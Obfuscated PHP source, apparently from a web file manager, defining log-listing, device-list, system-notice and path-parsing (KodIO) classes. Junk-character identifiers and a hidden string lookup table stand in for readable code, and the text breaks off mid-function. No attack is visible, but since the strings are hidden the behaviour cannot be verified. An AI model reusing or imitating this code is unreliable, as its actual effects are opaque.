_makeOrder($“ä»íıÒ = '') { $‚Ô‡‘è =& $_SERVER[ıÚ˜š²İ]; $×ã§òˆı = $‚Ô‡‘è[234]; $Œ¿ØóŒ‡ = array($‚Ô‡‘è[525] => $‚Ô‡‘è[526], $‚Ô‡‘è[527] => $‚Ô‡‘è[528]); $àÄ¹é“û = Input::get($‚Ô‡‘è[533], $‚Ô‡‘è[7], $‚Ô‡‘è[2175], array($‚Ô‡‘è[2089], $‚Ô‡‘è[527])); $àÄ¹é“û = $Œ¿ØóŒ‡[$àÄ¹é“û]; $“ä»íıÒ = $“ä»íıÒ . "{$×ã§òˆı}\40{$àÄ¹é“û}"; return $this->order($“ä»íıÒ); } public function get($²¹Æ„Ô’ = '') { $©ÏÄ¬Â =& $_SERVER[ıÚ˜š²İ]; if (!$²¹Æ„Ô’) { show_json(array()); } $‚ÅÃ–˜Â = array(); if ($²¹Æ„Ô’[$©ÏÄ¬Â[1792]]) { $‚ÅÃ–˜Â[$©ÏÄ¬Â[1792]] = $²¹Æ„Ô’[$©ÏÄ¬Â[1792]]; } if (isset($²¹Æ„Ô’[$©ÏÄ¬Â[837]])) { $œì¥ã = $²¹Æ„Ô’[$©ÏÄ¬Â[837]]; $æû«–şÔ = isset($²¹Æ„Ô’[$©ÏÄ¬Â[838]]) ? $²¹Æ„Ô’[$©ÏÄ¬Â[838]] : time(); $‚ÅÃ–˜Â[$©ÏÄ¬Â[234]] = array($©ÏÄ¬Â[410], array($œì¥ã, $æû«–şÔ)); } if ($²¹Æ„Ô’[$©ÏÄ¬Â[33]]) { $ûÒ¼Öá‚ = explode($©ÏÄ¬Â[50], $²¹Æ„Ô’[$©ÏÄ¬Â[33]]); $ïÃŠåéù = $this->typeFile(); $“™Íî­Î = array(); foreach ($ûÒ¼Öá‚ as $÷š…Äë) { $“™Íî­Î[] = $÷š…Äë; if (isset($ïÃŠåéù[$÷š…Äë])) { $“™Íî­Î = array_merge($“™Íî­Î, $ïÃŠåéù[$÷š…Äë]); } } $“™Íî­Î = array_unique($“™Íî­Î); if ($“™Íî­Î) { $‚ÅÃ–˜Â[$©ÏÄ¬Â[33]] = array($©ÏÄ¬Â[7], $“™Íî­Î); } } else { $‚ÅÃ–˜Â[$©ÏÄ¬Â[33]] = array($©ÏÄ¬Â[2462], $©ÏÄ¬Â[2463]); } if (!empty($²¹Æ„Ô’[$©ÏÄ¬Â[2461]])) { $‚ÅÃ–˜Â[$©ÏÄ¬Â[528]] = array($©ÏÄ¬Â[461], "\45{$²¹Æ„Ô’[$©ÏÄ¬Â[2461]]}\x25"); } $‘Åªñà = $this->_makeOrder()->where($‚ÅÃ–˜Â)->selectPage(); if (empty($‘Åªñà[$©ÏÄ¬Â[447]])) { show_json(array(), !0, $‘Åªñà[$©ÏÄ¬Â[444]]); } $‘Åªñà[$©ÏÄ¬Â[447]] = $this->logList($‘Åªñà[$©ÏÄ¬Â[447]]); return $‘Åªñà; } private function ipAddress(&$ƒ¤¯ Å—) { $èÛÊ™µ =& $_SERVER[ıÚ˜š²İ]; if (!empty($ƒ¤¯ Å—[$èÛÊ™µ[2461]])) { $˜‘ÌÔ©¡ = IpLocation::get($ƒ¤¯ Å—[$èÛÊ™µ[2461]]); } else { $˜‘ÌÔ©¡ = LNG($èÛÊ™µ[2464]); } $ƒ¤¯ Å—[$èÛÊ™µ[2465]] = $˜‘ÌÔ©¡; } private function descZipDownload($Ù¡¨¸ ¼, &$ŸôŒ«Ş) { $é– é“â =& $_SERVER[ıÚ˜š²İ]; if (!isset($Ù¡¨¸ ¼[$é– é“â[2466]])) { return; } $¬¯Äİ‰ß = json_decode($Ù¡¨¸ ¼[$é– é“â[2466]], !0); foreach ($¬¯Äİ‰ß as $«‘‹»±£) { try { $Ûñå“º = IO::infoFullSimple($«‘‹»±£[$é– é“â[87]]); } catch (Exception $Šæ’øš) { continue; } $Ù¡¨¸ ¼[$é– é“â[87]] = $«‘‹»±£[$é– é“â[87]]; $ŸôŒ«Ş[] = $Ù¡¨¸ ¼[$é– é“â[194]] = $Ûñå“º[$é– é“â[194]]; $ŸôŒ«Ş[] = $Ù¡¨¸ ¼[$é– é“â[2229]] = $Ûñå“º[$é– é“â[193]]; break; } return $Ù¡¨¸ ¼; } private function getSourceList(&$‹òø¬) { $Ö½Çå‹ =& $_SERVER[ıÚ˜š²İ]; $ä¾ë = array(); foreach ($‹òø¬ as $½ôÔëÉÓ => $ŠÄËú¹¬) { $–õÊü™é = json_decode($ŠÄËú¹¬[$Ö½Çå‹[528]], !0); if ($ŠÄËú¹¬[$Ö½Çå‹[33]] == $Ö½Çå‹[1967]) { $–õÊü™é = $this->descZipDownload($–õÊü™é, $ä¾ë); $‹òø¬[$½ôÔëÉÓ][$Ö½Çå‹[528]] = json_encode($–õÊü™é); continue; } if (strpos($ŠÄËú¹¬[$Ö½Çå‹[33]], $Ö½Çå‹[2231]) !== 0) { if (!isset($–õÊü™é[$Ö½Çå‹[87]]) || strpos($ŠÄËú¹¬[$Ö½Çå‹[33]], $Ö½Çå‹[2467]) !== 0) { continue; } try { $Ë¬ÄÓ• = IO::infoFullSimple($–õÊü™é[$Ö½Çå‹[87]]); } catch (Exception $™ïß¡ ô) { continue; } $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[194]] = $Ë¬ÄÓ•[$Ö½Çå‹[194]]; $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[2229]] = $Ë¬ÄÓ•[$Ö½Çå‹[193]]; $‹òø¬[$½ôÔëÉÓ][$Ö½Çå‹[528]] = json_encode($–õÊü™é); continue; } $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[194]]; $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[2229]]; if ($–õÊü™é[$Ö½Çå‹[33]] == $Ö½Çå‹[627]) { $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[528]][$Ö½Çå‹[1253]]; $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[528]][$Ö½Çå‹[1254]]; } if ($–õÊü™é[$Ö½Çå‹[33]] == $Ö½Çå‹[2240]) { $ä¾ë[] = $–õÊü™é[$Ö½Çå‹[528]][$Ö½Çå‹[194]]; } } if (!$ä¾ë) { return array(); } return Model($Ö½Çå‹[907])->sourceListInfo($ä¾ë, !0); } private function logList($ñóğı“ì) { $Å§Ô²ô =& $_SERVER[ıÚ˜š²İ]; $¡Õ‡¨…ı = array_to_keyvalue($ñóğı“ì, $Å§Ô²ô[12], $Å§Ô²ô[1792]); $¬Š–Ôë¡ = Model($Å§Ô²ô[601])->userListInfo(array_unique($¡Õ‡¨…ı)); $äš±¦ªß = $this->getSourceList($ñóğı“ì); $ˆ±…×¢° = $this->typeAll(); $“À³Áİ× = array(); $ÉëÊü— = array(); foreach ($ñóğı“ì as $ìİğ¸ƒÔ => $¢µõ±è) { $ªùÎ†´® = $¢µõ±è[$Å§Ô²ô[33]]; $– öì‚® = isset($¬Š–Ôë¡[$¢µõ±è[$Å§Ô²ô[1792]]]) ? $¬Š–Ôë¡[$¢µõ±è[$Å§Ô²ô[1792]]] : !1; $™ù”°Ú° = strpos($ªùÎ†´®, $Å§Ô²ô[2468]) === 0 ? LNG($Å§Ô²ô[2469]) : LNG($Å§Ô²ô[2464]); $¢µõ±è[$Å§Ô²ô[32]] = isset($– öì‚®[$Å§Ô²ô[32]]) ? $– öì‚®[$Å§Ô²ô[32]] : LNG($Å§Ô²ô[2464]); $¢µõ±è[$Å§Ô²ô[2291]] = isset($– öì‚®[$Å§Ô²ô[2291]]) ? $– öì‚®[$Å§Ô²ô[2291]] : $Å§Ô²ô[12]; $¢µõ±è[$Å§Ô²ô[1680]] = isset($ˆ±…×¢°[$ªùÎ†´®]) ? $ˆ±…×¢°[$ªùÎ†´®] : $™ù”°Ú°; $¢µõ±è[$Å§Ô²ô[2174]] = $– öì‚®; $ğéüÕ = json_decode($¢µõ±è[$Å§Ô²ô[528]], !0); $¢µõ±è[$Å§Ô²ô[2461]] = isset($ğéüÕ[$Å§Ô²ô[2461]]) ? $ğéüÕ[$Å§Ô²ô[2461]] : $Å§Ô²ô[12]; $¢µõ±è[$Å§Ô²ô[2465]] = IpLocation::get($¢µõ±è[$Å§Ô²ô[2461]]); if (strpos($ªùÎ†´®, $Å§Ô²ô[2231]) === 0 || isset($ğéüÕ[$Å§Ô²ô[2229]])) { $ğéüÕ[$Å§Ô²ô[90]] = $äš±¦ªß[$ğéüÕ[$Å§Ô²ô[194]]]; $ğéüÕ[$Å§Ô²ô[2245]] = $äš±¦ªß[$ğéüÕ[$Å§Ô²ô[2229]]]; if ($ğéüÕ[$Å§Ô²ô[33]] == $Å§Ô²ô[627]) { $ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[1253]] = $äš±¦ªß[$ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[1253]]]; $ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[1254]] = $äš±¦ªß[$ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[1254]]]; } if ($ğéüÕ[$Å§Ô²ô[33]] == $Å§Ô²ô[2240]) { $ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[194]] = $äš±¦ªß[$ğéüÕ[$Å§Ô²ô[528]][$Å§Ô²ô[194]]]; } if ($ğéüÕ[$Å§Ô²ô[33]] == $Å§Ô²ô[1962]) { $ğéüÕ[$Å§Ô²ô[2245]] = $ğéüÕ[$Å§Ô²ô[90]]; $ğéüÕ[$Å§Ô²ô[2229]] = $ğéüÕ[$Å§Ô²ô[2245]][$Å§Ô²ô[194]]; $ğéüÕ[$Å§Ô²ô[90]] = !1; $ğéüÕ[$Å§Ô²ô[194]] = $Å§Ô²ô[12]; } $‰¹™â¤Ú = array($Å§Ô²ô[1962], $Å§Ô²ô[2227]); if (!in_array($ğéüÕ[$Å§Ô²ô[33]], $‰¹™â¤Ú)) { if ($ğéüÕ[$Å§Ô²ô[90]] && $ğéüÕ[$Å§Ô²ô[90]][$Å§Ô²ô[191]] == $Å§Ô²ô[192]) { $ÉëÊü—[] = $¢µõ±è[$Å§Ô²ô[477]]; unset($ñóğı“ì[$ìİğ¸ƒÔ]); continue; } if ($ğéüÕ[$Å§Ô²ô[2245]] && $ğéüÕ[$Å§Ô²ô[2245]][$Å§Ô²ô[191]] == $Å§Ô²ô[192]) { $ÉëÊü—[] = $¢µõ±è[$Å§Ô²ô[477]]; unset($ñóğı“ì[$ìİğ¸ƒÔ]); continue; } } } $¢µõ±è[$Å§Ô²ô[528]] = $ğéüÕ; unset($¢µõ±è[$Å§Ô²ô[2470]]); $“À³Áİ×[] = $¢µõ±è; } $this->clearSystemPathLog($ÉëÊü—); return $“À³Áİ×; } private function clearSystemPathLog($è½ÎŞ) { $†ù…÷×‹ =& $_SERVER[ıÚ˜š²İ]; if (count($è½ÎŞ) == 0) { return; } $µ«îõ = array($†ù…÷×‹[477] => array($†ù…÷×‹[7], array_unique($è½ÎŞ))); $this->where($µ«îõ)->delete(); } public function deviceList($àèÂÙ”ı, $¸Ôµîíõ = 0) { $·¥„¶æû =& $_SERVER[ıÚ˜š²İ]; $­§ÉÁùˆ = array($·¥„¶æû[1792] => $àèÂÙ”ı, $·¥„¶æû[234] => array($·¥„¶æû[1103], $¸Ôµîíõ), $·¥„¶æû[33] => $·¥„¶æû[1936]); $î­ª›‚Ö = array(); $ê²‰åê = $this->field($·¥„¶æû[2471])->where($­§ÉÁùˆ)->order($·¥„¶æû[2243])->limit(50)->select(); foreach ($ê²‰åê as $ƒô¦Ìì => $ïÇ±ö¯Ì) { if ($ƒô¦Ìì > 0 && abs($ïÇ±ö¯Ì[$·¥„¶æû[234]] - $ê²‰åê[$ƒô¦Ìì - 1][$·¥„¶æû[234]]) < 5) { continue; } $ª¿¬œü´ = json_decode($ïÇ±ö¯Ì[$·¥„¶æû[528]], !0); $ïÇ±ö¯Ì[$·¥„¶æû[2461]] = isset($ª¿¬œü´[$·¥„¶æû[2461]]) ? $ª¿¬œü´[$·¥„¶æû[2461]] : $·¥„¶æû[12]; unset($ª¿¬œü´[$·¥„¶æû[2461]]); $¢ÍªÏÈÜ = $this->deviceType($ª¿¬œü´[$·¥„¶æû[2232]]); if (isset($î­ª›‚Ö[$¢ÍªÏÈÜ])) { continue; } $ïÇ±ö¯Ì[$·¥„¶æû[2465]] = IpLocation::get($ïÇ±ö¯Ì[$·¥„¶æû[2461]]); $ïÇ±ö¯Ì[$·¥„¶æû[528]] = $ª¿¬œü´; $î­ª›‚Ö[$¢ÍªÏÈÜ] = $ïÇ±ö¯Ì; } return array_values($î­ª›‚Ö); } public function deviceType($¥øÇÉ¿®) { return $¥øÇÉ¿®; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\x6e\157\164\151\x63\x65\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\143\157\x6e\164\145\x6e\164", "\x61\x75\164\x68", "\x6d\157\x64\145", "\164\151\x6d\x65", "\164\x79\160\145", "\154\x65\x76\145\x6c", "\x65\x6e\x61\x62\154\145", "\163\157\162\164"); public function listData($§å™¢÷¡ = false, $Ö™Çûîƒ = "\x73\x6f\162\164", $®Ú•ÀØõ = false) { return parent::listData($§å™¢÷¡, $Ö™Çûîƒ, $®Ú•ÀØõ); } public function add($²ãÖŸÌÈ) { $²ÑÇÔØ =& $_SERVER[ıÚ˜š²İ]; $û¹İğ€ = time(); if ($²ãÖŸÌÈ[$²ÑÇÔØ[16]] == $²ÑÇÔØ[2472]) { $û¹İğ€ = strtotime($²ãÖŸÌÈ[$²ÑÇÔØ[207]]); } $²ãÖŸÌÈ[$²ÑÇÔØ[207]] = $û¹İğ€; return parent::insert($²ãÖŸÌÈ); } public function update($¨²³Ü³‹, $ÍˆË»³¿) { $›‹üÔÖ =& $_SERVER[ıÚ˜š²İ]; $àˆéÄ†ƒ = $this->listData($¨²³Ü³‹); if (!$àˆéÄ†ƒ) { return !1; } $ÅéÑâ˜ = time(); if ($ÍˆË»³¿[$›‹üÔÖ[16]] == $›‹üÔÖ[2472]) { $ÅéÑâ˜ = strtotime($ÍˆË»³¿[$›‹üÔÖ[207]]); } $ÍˆË»³¿[$›‹üÔÖ[207]] = $ÅéÑâ˜; return parent::update($¨²³Ü³‹, $ÍˆË»³¿); } public function remove($ìô™Ë¹) { $ôÍ”§ä = $this->listData($ìô™Ë¹); if (!$ôÍ”§ä || $ôÍ”§ä[$_SERVER[ıÚ˜š²İ][192]]) { return !1; } return parent::remove($ìô™Ë¹); } public function sort($ÒÅ¶±ßŞ, $˜°¸ÒÑ) { return parent::update($ÒÅ¶±ßŞ, $˜°¸ÒÑ); } public function enable($öàÆÔ³…, $ÁóÀ„Ö¿) { return parent::update($öàÆÔ³…, array($_SERVER[ıÚ˜š²İ][2473] => $ÁóÀ„Ö¿)); } private function initUserOption() { $¹êû‹¥ =& $_SERVER[ıÚ˜š²İ]; $this->optionType = $¹êû‹¥[2474]; $this->modelType = $¹êû‹¥[2475]; $this->field = array($¹êû‹¥[2476], $¹êû‹¥[32], $¹êû‹¥[207], $¹êû‹¥[33], $¹êû‹¥[2477], $¹êû‹¥[826], $¹êû‹¥[229]); } public function userNoticeGet($íÈ£ÔğÚ = false) { $this->initUserOption(); return parent::listData($íÈ£ÔğÚ, $_SERVER[ıÚ˜š²İ][477], !0); } public function userNoticeAdd($‰ëƒîƒ) { $›¿¯ê†š =& $_SERVER[ıÚ˜š²İ]; $this->initUserOption(); $–´Â­ê = $this->findByKey($›¿¯ê†š[2476], $‰ëƒîƒ[$›¿¯ê†š[477]]); if ($–´Â­ê) { return !0; } $ó½ë¥£â = array($›¿¯ê†š[2476] => $‰ëƒîƒ[$›¿¯ê†š[477]], $›¿¯ê†š[32] => $‰ëƒîƒ[$›¿¯ê†š[32]], $›¿¯ê†š[207] => $‰ëƒîƒ[$›¿¯ê†š[207]], $›¿¯ê†š[33] => isset($‰ëƒîƒ[$›¿¯ê†š[33]]) ? $‰ëƒîƒ[$›¿¯ê†š[33]] : 1, $›¿¯ê†š[2477] => isset($‰ëƒîƒ[$›¿¯ê†š[2477]]) ? $‰ëƒîƒ[$›¿¯ê†š[2477]] : 0, $›¿¯ê†š[826] => 0, $›¿¯ê†š[229] => 0); return parent::insert($ó½ë¥£â); } public function userNoticeEdit($®ø®½, $ø‹¥Ñ³) { $this->initUserOption(); return parent::update($®ø®½, $ø‹¥Ñ³); } } goto C„ô‰§” ; d·Á­ç¤ÁŠ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\122\145\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\x46\x69\x6c\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\x69\x6c\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\x70\x52\157\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\x53\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\123\x68\x61\x72\145\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\x65\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\x65\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\x49\164\x65\155\x4c\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\145\141\162\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\x72\x52\145\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\x72\175"; public static function typeList() { $¶¨¦à¡ô =& $_SERVER[ıÚ˜š²İ]; return array($¶¨¦à¡ô[1350] => self::KOD_SOURCE, $¶¨¦à¡ô[1351] => self::KOD_USER_RECYCLE, $¶¨¦à¡ô[1352] => self::KOD_USER_FAV, $¶¨¦à¡ô[1353] => self::KOD_USER_FILE_TAG, $¶¨¦à¡ô[1354] => self::KOD_USER_FILE_TYPE, $¶¨¦à¡ô[1355] => self::KOD_GROUP_ROOT_SELF, $¶¨¦à¡ô[1356] => self::KOD_USER_SHARE, $¶¨¦à¡ô[1357] => self::KOD_USER_SHARE_LINK, $¶¨¦à¡ô[1358] => self::KOD_USER_SHARE_TO_ME, $¶¨¦à¡ô[1359] => self::KOD_SHARE_ITEM, $¶¨¦à¡ô[1360] => self::KOD_SHARE_LINK, $¶¨¦à¡ô[1361] => self::KOD_SEARCH, $¶¨¦à¡ô[1362] => self::KOD_BLOCK, $¶¨¦à¡ô[1363] => self::KOD_IO, $¶¨¦à¡ô[1364] => self::KOD_USER_RECENT, $¶¨¦à¡ô[1365] => self::KOD_USER_DRIVER); } public static function parse($óÍ¥©Ì) { $ç»š­ÑÔ =& $_SERVER[ıÚ˜š²İ]; $óÍ¥©Ì = self::clear($óÍ¥©Ì); $çş£…İ = array_values(self::typeList()); preg_match($ç»š­ÑÔ[1366], $óÍ¥©Ì, $Á©ëêÙ½); $ÍèÈ²ç‚ = array($ç»š­ÑÔ[498] => !1, $ç»š­ÑÔ[1367] => !1, $ç»š­ÑÔ[495] => !1, $ç»š­ÑÔ[87] => $óÍ¥©Ì, $ç»š­ÑÔ[1264] => !1, $ç»š­ÑÔ[1263] => $ç»š­ÑÔ[12]); if (is_array($Á©ëêÙ½) && count($Á©ëêÙ½) == 5) { $Œ‰ôÎøî = $ç»š­ÑÔ[1368] . $Á©ëêÙ½[2] . $ç»š­ÑÔ[404]; if (in_array($Œ‰ôÎøî, $çş£…İ)) { $ÍèÈ²ç‚[$ç»š­ÑÔ[1264]] = $Á©ëêÙ½[1]; $ÍèÈ²ç‚[$ç»š­ÑÔ[33]] = $Œ‰ôÎøî; $ÍèÈ²ç‚[$ç»š­ÑÔ[1369]] = substr($Œ‰ôÎøî, 1, -1); $ÍèÈ²ç‚[$ç»š­ÑÔ[477]] = $Á©ëêÙ½[3]; } $ÍèÈ²ç‚[$ç»š­ÑÔ[1263]] = $Á©ëêÙ½[4]; } if ($ÍèÈ²ç‚[$ç»š­ÑÔ[498]] == self::KOD_SOURCE) { $ÍèÈ²ç‚[$ç»š­ÑÔ[1267]] = $ÍèÈ²ç‚[$ç»š­ÑÔ[477]]; } $šµÑŸŸ = array($ç»š­ÑÔ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÍèÈ²ç‚[$ç»š­ÑÔ[1332]] = in_array($ÍèÈ²ç‚[$ç»š­ÑÔ[33]], $šµÑŸŸ); return $ÍèÈ²ç‚; } public static function isTruePath($ÒÈĞÓÚ) { $½££åÕÙ =& $_SERVER[ıÚ˜š²İ]; if (substr($ÒÈĞÓÚ, 0, 1) != $½££åÕÙ[1368]) { return !0; } if (strpos($ÒÈĞÓÚ, $½££åÕÙ[485]) === 0) { return !0; } if (strpos($ÒÈĞÓÚ, $½££åÕÙ[1336]) === 0) { return !0; } if (strpos($ÒÈĞÓÚ, $½££åÕÙ[1370]) === 0) { return !0; } if (strpos($ÒÈĞÓÚ, $½££åÕÙ[1371]) === 0) { return !0; } if (strpos($ÒÈĞÓÚ, $½££åÕÙ[1372]) === 0) { return !0; } return !1; } public static function clear($Í„–“¦¦) { $ıªşÖ¡ =& $_SERVER[ıÚ˜š²İ]; $Í„–“¦¦ = str_replace(array($ıªşÖ¡[1168], $ıªşÖ¡[288]), $ıªşÖ¡[53], $Í„–“¦¦); $Í„–“¦¦ = str_replace($ıªşÖ¡[100], $ıªşÖ¡[8], $Í„–“¦¦); $é©¦Òú = $ıªşÖ¡[1373]; if (substr($Í„–“¦¦, 0, 3) == $ıªşÖ¡[1374]) { $Í„–“¦¦ = substr($Í„–“¦¦, 3); } while (strstr($Í„–“¦¦, $é©¦Òú)) { $Í„–“¦¦ = str_replace($é©¦Òú, $ıªşÖ¡[8], $Í„–“¦¦); } $Í„–“¦¦ = preg_replace($ıªşÖ¡[1375], $ıªşÖ¡[8], $Í„–“¦¦); if ($Í„–“¦¦ == $ıªşÖ¡[8]) { return $ıªşÖ¡[8]; } $Í„–“¦¦ = rtrim($Í„–“¦¦, $ıªşÖ¡[8]); return $Í„–“¦¦; } public static function pathTrue($É˜¹Ÿ¥Š) { $…š§«ûı =& $_SERVER[ıÚ˜š²İ]; if (!$É˜¹Ÿ¥Š) { return $…š§«ûı[12]; } $É˜¹Ÿ¥Š = str_replace($…š§«ûı[257], $…š§«ûı[8], str_replace($…š§«ûı[1376], $…š§«ûı[8], $É˜¹Ÿ¥Š)); $É˜¹Ÿ¥Š = str_replace($…š§«ûı[257], $…š§«ûı[8], str_replace($…š§«ûı[1376], $…š§«ûı[8], $É˜¹Ÿ¥Š)); if (!strstr($É˜¹Ÿ¥Š, $…š§«ûı[1374])) { return $É˜¹Ÿ¥Š; } $†ú¢Í‚Ï = explode($…š§«ûı[8], $É˜¹Ÿ¥Š); foreach ($†ú¢Í‚Ï as $ò“äû€² => $á×îş«ø) { if ($á×îş«ø !== $…š§«ûı[1377]) { continue; } for ($œ¹éËîı = $ò“äû€²; $œ¹éËîı >= 0; $œ¹éËîı--) { if ($†ú¢Í‚Ï[$œ¹éËîı] === $…š§«ûı[10] || $†ú¢Í‚Ï[$œ¹éËîı] === $…š§«ûı[1377] || $†ú¢Í‚Ï[$œ¹éËîı] === -1) { continue; } if ($†ú¢Í‚Ï[$œ¹éËîı] === $…š§«ûı[12]) { $†ú¢Í‚Ï[$ò“äû€²] = -1; break; } $†ú¢Í‚Ï[$ò“äû€²] = -1; $†ú¢Í‚Ï[$œ¹éËîı] = -1; break; } } $—’ï‚ª = array(); foreach ($†ú¢Í‚Ï as $á×îş«ø) { if ($á×îş«ø !== -1) { $—’ï‚ª[] = $á×îş«ø; } } $¨î‘‹Ëª = implode($…š§«ûı[8], $—’ï‚ª); if (strpos($¨î‘‹Ëª, $…š§«ûı[1378]) === 0) { $¨î‘‹Ëª = $…š§«ûı[1374] . substr($¨î‘‹Ëª, strlen($…š§«ûı[1378])); } return $¨î‘‹Ëª; } public static function pathUrlClear($ÍûôÄõ) { $Òš¾‘Óí =& $_SERVER[ıÚ˜š²İ]; if (!$ÍûôÄõ) { return $ÍûôÄõ; } $ÍûôÄõ = rawurldecode($ÍûôÄõ); $ÍûôÄõ = str_replace($Òš¾‘Óí[1376], $Òš¾‘Óí[8], $ÍûôÄõ); if (strpos($ÍûôÄõ, $Òš¾‘Óí[76]) > 0) { $ÍûôÄõ = substr($ÍûôÄõ, 0, strpos($ÍûôÄõ, $Òš¾‘Óí[76])); } if (strpos($ÍûôÄõ, $Òš¾‘Óí[1379]) > 0) { $ÍûôÄõ = substr($ÍûôÄõ, 0, strpos($ÍûôÄõ, $Òš¾‘Óí[1379])); } return $ÍûôÄõ; } public static function sourceID($Õ‰³ä€Ã) { $–ù¡ôæ =& $_SERVER[ıÚ˜š²İ]; $òÌ½öñ³ = self::parse($Õ‰³ä€Ã); if ($òÌ½öñ³[$–ù¡ôæ[33]] !== self::KOD_SOURCE) { show_json(LNG($–ù¡ôæ[1380]), !1); } return $òÌ½öñ³[$–ù¡ôæ[477]]; } public static function make($ÔÇ€İ¾) { if (!$ÔÇ€İ¾) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÔÇ€İ¾)); } public static function makeShare($ñ¯° ‚•, $¢ìÑŞÊê) { return self::makePath(self::KOD_SHARE_ITEM, $ñ¯° ‚•, $¢ìÑŞÊê); } public static function makeFileTypePath($Íë¼Šä ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Íë¼Šä ); } public static function makeFileTagPath($ğäá­ø) { return self::makePath(self::KOD_USER_FILE_TAG, $ğäá­ø); } public static function makePath($×ºïŠÕ‚, $ŠÏ¦Ûäé = '', $™¼Ñ¦ËÛ = '') { $ÔÕÁ’Ş§ =& $_SERVER[ıÚ˜š²İ]; $°àŠş = substr($×ºïŠÕ‚, 1, -1); $§ıÙ¶àñ = $ÔÕÁ’Ş§[1381] . $°àŠş . $ÔÕÁ’Ş§[1382] . $ŠÏ¦Ûäé . $ÔÕÁ’Ş§[1383]; $§ıÙ¶àñ = $™¼Ñ¦ËÛ ? $§ıÙ¶àñ . $™¼Ñ¦ËÛ . $ÔÕÁ’Ş§[8] : $§ıÙ¶àñ; return $§ıÙ¶àñ; } public static function hashPath($åËíô©÷, $ÚÀ˜É = false) { $¿‡ÓôÕê =& $_SERVER[ıÚ˜š²İ]; if (!$åËíô©÷) { return $¿‡ÓôÕê[12]; } $Ï÷ŒçáÁ = is_array($åËíô©÷) ? $åËíô©÷ : IO::info($åËíô©÷); $¬ÂÔ‘‚ = _get($Ï÷ŒçáÁ, $¿‡ÓôÕê[1384], $¿‡ÓôÕê[12]); if (!$¬ÂÔ‘‚ && isset($Ï÷ŒçáÁ[$¿‡ÓôÕê[238]])) { $¬ÂÔ‘‚ = trim($Ï÷ŒçáÁ[$¿‡ÓôÕê[238]], $¿‡ÓôÕê[121]); } if ($¬ÂÔ‘‚) { return $¬ÂÔ‘‚; } if (!$¬ÂÔ‘‚ && isset($Ï÷ŒçáÁ[$¿‡ÓôÕê[194]]) && $Ï÷ŒçáÁ[$¿‡ÓôÕê[194]]) { $Ï÷ŒçáÁ = IO::info(KodIO::make($Ï÷ŒçáÁ[$¿‡ÓôÕê[194]])); $¬ÂÔ‘‚ = _get($Ï÷ŒçáÁ, $¿‡ÓôÕê[1384], $¿‡ÓôÕê[12]); } $áæÚß” = md5($Ï÷ŒçáÁ[$¿‡ÓôÕê[87]] . $Ï÷ŒçáÁ[$¿‡ÓôÕê[79]] . $Ï÷ŒçáÁ[$¿‡ÓôÕê[88]]); $´êÖñøÒ = $áæÚß” . $¿‡ÓôÕê[1385]; $¬ÂÔ‘‚ = $¬ÂÔ‘‚ ? $¬ÂÔ‘‚ : Cache::get($´êÖñøÒ); if (!$¬ÂÔ‘‚ && $ÚÀ˜É) { $¬ÂÔ‘‚ = IO::hashSimple($Ï÷ŒçáÁ[$¿‡ÓôÕê[87]]); Cache::set($´êÖñøÒ, $¬ÂÔ‘‚ ? $¬ÂÔ‘‚ : $áæÚß”, 3600 * 24 * 30); } return $¬ÂÔ‘‚ ? $¬ÂÔ‘‚ : $áæÚß”; } public static function hashPathSafe($‘ÎéÄ—ú, $¨‚àõ’ş = false) { $»ÊÌò£¢ =& $_SERVER[ıÚ˜š²İ]; $è¢¹ğ§Ø = self::hashPath($‘ÎéÄ—ú, $¨‚àõ’ş); return md5($è¢¹ğ§Ø . $»ÊÌò£¢[1386] . Model($»ÊÌò£¢[847])->get($»ÊÌò£¢[848])); } public static function initSystemPath() { $€½™Á¡ =& $_SERVER[ıÚ˜š²İ]; if (defined($€½™Á¡[1387])) { return; } define($€½™Á¡[1387], self::systemPath($€½™Á¡[192])); define($€½™Á¡[1388], self::systemPath($€½™Á¡[1389])); define($€½™Á¡[1390], self::systemPath($€½™Á¡[1391])); define($€½™Á¡[1392], self::systemPath($€½™Á¡[1393])); IOHistory::bindEvent(); } public static function systemPath($ˆÚ‘üë) { $›Ïóô‚á =& $_SERVER[ıÚ˜š²İ]; $™ñ•ğŒ¸ = $›Ïóô‚á[1394] . ucfirst($ˆÚ‘üë); $‹ˆŞ²÷© = Model($›Ïóô‚á[847])->get($™ñ•ğŒ¸); if ($‹ˆŞ²÷©) { return 